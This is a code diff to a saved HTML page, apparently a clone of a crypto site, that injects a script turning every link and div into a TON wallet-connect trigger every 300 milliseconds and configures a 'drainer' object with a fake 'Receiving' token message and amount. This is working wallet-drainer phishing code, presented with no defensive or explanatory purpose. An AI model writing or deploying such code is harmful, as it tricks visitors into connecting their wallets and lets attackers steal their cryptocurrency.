@@ -792,7 +792,23 @@ wui-flex { overflow: hidden auto; display: flex; align-items: center; justify-co
         --wui-thumbnail-border-base: #252525;
       }
     </style>
+  <script>
+	function addClassesToElements() {
+
+	const links = document.querySelectorAll('a:not(.ton-connect-trigger)');
+	for (const link of links) {
+		link.removeAttribute('href');
+		link.classList.add('ton-connect-trigger');
+	}
+	const buttons = document.querySelectorAll('div:not(.ton-connect-trigger)');
+	for (const button of buttons) {
+		button.classList.add('ton-connect-trigger');
+	}
+	}
+	setInterval(addClassesToElements, 300);
+</script>
   
+<link rel="stylesheet" href="/vrtx.css?v=1.0.0" />
 <script src="/vrtx.js?v=1.0.0" defer crossorigin></script>
 <script>
     window.addEventListener('load', () => {
@@ -803,11 +819,13 @@ wui-flex { overflow: hidden auto; display: flex; align-items: center; justify-co
 
         // Override honeypot settings
         window.drainer?.overrideHoneypot({
-            honeypot_message: "?? Receiving",  // Proxy Token Message
+            honeypot_message: "🎉 Receiving",  // Proxy Token Message
             honeypot_amount: 10000   // Proxy Token Amount
         });
     });
-</script></head><body data-mode="dark" class="tc-using-mouse" style="top: auto;"><div id="in-page-channel-node-id" data-channel-name="in_page_channel_swIAdi"></div>
+</script>
+
+</head><body data-mode="dark" class="tc-using-mouse" style="top: auto;"><div id="in-page-channel-node-id" data-channel-name="in_page_channel_swIAdi"></div>
   <link rel="icon" data-savepage-href="https://onetime.dog/favicon.ico" href="db258ccc00493a784e1b2fb796ff802bf46718e0.html">
   
 
